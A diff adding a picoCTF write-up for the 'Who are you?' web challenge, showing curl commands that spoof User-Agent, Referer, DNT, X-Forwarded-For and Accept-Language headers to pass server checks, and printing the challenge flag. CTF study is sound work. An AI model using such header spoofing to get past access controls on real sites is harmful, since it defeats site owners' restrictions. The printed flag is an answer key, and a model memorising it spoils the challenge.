@@ -3,6 +3,98 @@
 ## Web Exploitation
 
 ##### Problem
+###### Who are you?
+> Description
+> Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:34588/
+
+By visiting the page, one gets the following: "Only people who use the official PicoBrowser are allowed on this site!"
+
+##### Solution
+
+Sending the User-Agent as `PicoBrowser`, do not simple solve the issue.
+
+```sh
+curl -v -i -A "PicoBrowser" http://mercury.picoctf.net:34588/
+```
+
+```html
+                <div class="row">
+                        <div class="col-xs-12 col-sm-12 col-md-12">
+                                <h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>
+                        </div>
+                </div>
+```
+
+Sending Referer HEADER field
+
+```sh
+curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" http://mercury.picoctf.net:34588/
+```
+```html
+                <div class="row">
+                        <div class="col-xs-12 col-sm-12 col-md-12">
+                                <h3 style="color:red">Sorry, this site only worked in 2018.</h3>
+                        </div>
+                </div>
+```
+
+I had to try different HEADER options regarding age. The output changed when I used `max-age` and `Date`.
+
+```sh
+curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" http://mercury.picoctf.net:34588/
+```
+```html
+                <div class="row">
+                        <div class="col-xs-12 col-sm-12 col-md-12">
+                                <h3 style="color:red">I don&#39;t trust users who can be tracked.</h3>
+                        </div>
+                </div>
+```
+
+They were using an old `Do Not Track (DNT)` which accepts value 1 if client don't want to be tracked.
+```sh
+curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" http://mercury.picoctf.net:34588/
+```
+```html
+                <div class="row">
+                        <div class="col-xs-12 col-sm-12 col-md-12">
+                                <h3 style="color:red">This website is only for people from Sweden.</h3>
+                        </div>
+                </div>
+```
+
+I must admit that I have almost gave up on this one, since I have tried `Accept-Language`, `Content-Language` and many other ones related to language. I also tried `CountryCode`, `Country`, `IP` and other few ones. 
+
+I tried `http IP header` in the Web Search and the result came: The `X-Forwarded-For` (XFF) HTTP header field is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.
+
+Let's try this one by using the IP range from Sweden. I have found an IP here: https://lite.ip2location.com/sweden-ip-address-ranges
+
+
+```sh
+curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 2.16.66.1" http://mercury.picoctf.net:34588/
+```
+```html
+                <div class="row">
+                        <div class="col-xs-12 col-sm-12 col-md-12">
+                                <h3 style="color:red">You&#39;re in Sweden but you don&#39;t speak Swedish?</h3>
+                        </div>
+                </div>
+```
+
+Now the process is easy!
+
+```sh
+curl -v -i -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588/" -H "max-age: 2018" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 2.16.66.1" -H "Accept-Language: sv-SE" http://mercury.picoctf.net:34588/
+```
+
+**FLAG**
+```
+picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}
+
+```
+
+
+##### Problem
 ###### dont-use-client-side
 > Description
 > Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/29835/ (link) or http://jupiter.challenges.picoctf.org:29835
